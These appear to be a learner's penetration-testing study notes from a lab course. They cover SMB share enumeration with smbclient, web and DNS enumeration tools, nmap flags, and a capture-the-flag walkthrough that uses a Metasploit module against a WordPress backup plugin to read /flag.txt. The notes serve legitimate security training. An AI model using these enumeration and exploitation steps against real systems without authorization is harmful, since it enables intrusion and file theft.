## SMB shares

To connect to a SMB share over a network as the user Bob
```
smbclient -U bob \\\\10.129.74.37\\users
```
To just look at the users on the network, use this command
```
smbclient -N -L \\\*ip-adress*
```

# Web Enumeration

## Se any hidden files or directories on a webserver that is not intended for public access. 

Tools: 

https://github.com/ffuf/ffuf

https://github.com/OJ/gobuster

## HTTP status codes

https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

## DNS Subdomain Enumeration

Contains many useful lists for fuzzing and exploitation: https://github.com/danielmiessler/SecLists

Take screenshots of target web applications, fingerprint them, and indentify possible default credentials: https://github.com/FortyNorthSecurity/EyeWitness

## Video to help

https://www.youtube.com/watch?v=6Ekm0hXfvME

## First hack with Metasploit

Q: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

I first open up the target in my browser to see what we are working with. I meet a webpage displaying the text "Simple Backup Plugin 2.7.10 for WordPress".

I search up "simple backup" on Metasploit to see if I get any hits on it. The rest I will show is the commands to this hack.
<br>

```
msf6 > search simple backup
```
<br>

```
msf6 > use 0
```
<br>

```
msf6 > options
```
<br>

```
msf6 > set RHOST *ip-adress
```
<br>

```
msf6 > set RPORT *port
```
<br>

*this is because the question is asking us to try and get the content of the /flag.txt
```
msf6 > set FILEPATH /flag.txt
```
<br>

```
msf6 > run
```
<br>


```
cd /home/kali/.msf4/loot
```
<br>

```
ls
```
<br>


```
cat *file that you have displayed with the ls command
```
<br>

And there you have your flag. Your first hack


## Useful nmap commands list

---

Nmap dash list

-sV = Version scan

-sC = Specify Nmap scripts

-p- = Scans all 65,535 TCP ports

-sV --script=banner = Banner grabbing

---
<br>

To learn more about nmap: https://academy.hackthebox.com/module/details/19

